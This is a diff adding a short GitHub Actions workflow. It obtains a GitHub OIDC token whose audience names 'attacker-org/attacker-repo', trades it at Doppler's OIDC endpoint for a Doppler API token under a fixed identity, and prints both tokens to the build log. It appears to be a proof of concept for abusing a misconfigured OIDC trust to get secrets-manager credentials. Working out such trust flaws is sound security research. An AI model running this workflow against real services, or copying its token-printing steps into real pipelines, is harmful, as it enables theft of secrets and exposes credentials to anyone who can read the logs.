@@ -1,0 +1,40 @@
+name: Doppler OIDC Test
+on:
+  push:
+    branches: [main]
+jobs:
+  fetch-oidc-token:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+      - name: Get GitHub OIDC Token
+        id: oidc
+        run: |
+          OIDC_TOKEN=$(curl -sS "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https://github.com/attacker-org/attacker-repo" \
+            -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            -H "Accept: application/json" | jq -r '.value')
+          if [ -z "$OIDC_TOKEN" ] || [ "$OIDC_TOKEN" == "null" ]; then
+            echo "Error: Failed to retrieve OIDC token"
+            exit 1
+          fi
+          echo "OIDC_TOKEN=$OIDC_TOKEN" >> $GITHUB_ENV
+          echo "GitHub OIDC Token: $OIDC_TOKEN"
+      - name: Authenticate with Doppler
+        run: |
+          RESPONSE=$(curl -sS --request POST \
+            --url https://api.doppler.com/v3/auth/oidc \
+            --header 'Content-Type: application/json' \
+            --data "{\"identity\": \"10d091e1-902d-4dc7-b436-22d1a7d14eaf\", \"token\": \"$OIDC_TOKEN\"}")
+          echo "Doppler Response: $RESPONSE"
+          DOPPLER_TOKEN=$(echo $RESPONSE | jq -r '.token')
+          if [ -z "$DOPPLER_TOKEN" ] || [ "$DOPPLER_TOKEN" == "null" ]; then
+            echo "Error: Failed to retrieve Doppler API token"
+            exit 1
+          fi
+          echo "DOPPLER_TOKEN=$DOPPLER_TOKEN" >> $GITHUB_ENV
+          echo "Doppler API Token: $DOPPLER_TOKEN"
+    
